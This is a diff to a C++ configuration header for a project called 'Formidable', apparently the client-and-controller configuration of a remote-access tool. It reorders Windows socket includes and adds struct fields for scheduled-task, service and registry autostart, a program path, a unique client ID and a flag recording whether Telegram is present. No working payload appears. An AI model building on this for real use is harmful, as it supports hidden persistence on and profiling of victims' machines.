@@ -4,9 +4,15 @@
  */
 #ifndef FORMIDABLE_CONFIG_H
 #define FORMIDABLE_CONFIG_H
+#ifndef _WINSOCKAPI_
+#define _WINSOCKAPI_
+#endif
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
-#include <windows.h>
 #include <string>
 #include <cstdint>
 #pragma comment(lib, "ws2_32.lib")
@@ -169,7 +175,10 @@ namespace Formidable {
         char        szInstallDir[MAX_PATH];  // 安装目录
         char        szInstallName[MAX_PATH]; // 程序名称
         char        szDownloadUrl[512];      // 下载地址
-        char        szReserved[10];  // 占位
+        char        taskStartup;     // 计划任务自启
+        char        serviceStartup;  // 服务自启
+        char        registryStartup; // 注册表自启
+        char        szReserved[7];   // 占位
         uint64_t    clientID;        // 客户端唯一标识
         uint64_t    parentHwnd;      // 父进程窗口句柄
         uint64_t    superAdmin;      // 管理员主控ID
@@ -196,11 +205,14 @@ namespace Formidable {
         char installTime[64];   // 安装/上线时间
         char uptime[64];        // 系统运行时间
         char version[32];       // 客户端版本
+        char programPath[MAX_PATH]; // 程序路径
         uint32_t processID;
+        uint64_t clientUniqueId; // 客户端唯一标识
         int32_t rtt;            // 延迟
         int32_t is64Bit;        // 使用int32代替bool
         int32_t isAdmin;
         int32_t hasCamera;
+        int32_t hasTelegram;
         int32_t clientType;     // 客户端类型
         wchar_t remark[256];    // 客户端备注
         wchar_t group[128];     // 客户端分组
@@ -225,6 +237,9 @@ namespace Formidable {
         "",                     // szInstallDir
         "",                     // szInstallName
         "",                     // szDownloadUrl
+        0,                      // taskStartup
+        0,                      // serviceStartup
+        0,                      // registryStartup
         "",                     // szReserved
         0,                      // clientID
         0,                      // parentHwnd
